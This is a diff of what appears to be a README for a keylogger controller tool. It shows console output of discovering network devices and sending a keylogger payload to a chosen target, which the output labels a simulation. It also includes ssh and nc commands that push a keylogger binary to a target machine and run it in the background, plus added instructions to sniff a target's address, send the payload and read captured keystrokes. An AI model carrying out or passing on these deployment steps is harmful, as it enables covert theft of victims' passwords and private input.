@@ -4,13 +4,13 @@ $ sudo python3 controller.py
 Starting keylogger controller...
 
 Discovered Devices:
-1. IP: 192.168.104.6   MAC: b2:7e:dd:4c:1b:55
+1. IP: ***.***.**.*  MAC: **:**:**:**:**;
 
 Select target number to send payload to: 1
 
 [+] Selected Target: 192.168.104.6
-[*] Sending keylogger payload to 192.168.104.6 ...
-[+] Payload delivered to 192.168.104.6 (simulation)
+[*] Sending keylogger payload to ***.***.**.* ...
+[+] Payload delivered to ***.***.**.* (simulation)
  ---->>>>#THIS IS A SIMULATIO<-------
 
 To send to a target
@@ -25,4 +25,17 @@ ssh user@target_ip 'chmod +x /tmp/keylogger && /tmp/keylogger &'
 for the attacker
 
 nc target_ip 9999 < ../payloads/target/release/payloads
+
+WORKINS
+clone to your enviornment, sniff out target ip/mac address, send pay log
+enter log directory to see keystroke
+
+
+
+
+
+
+
+
+
 
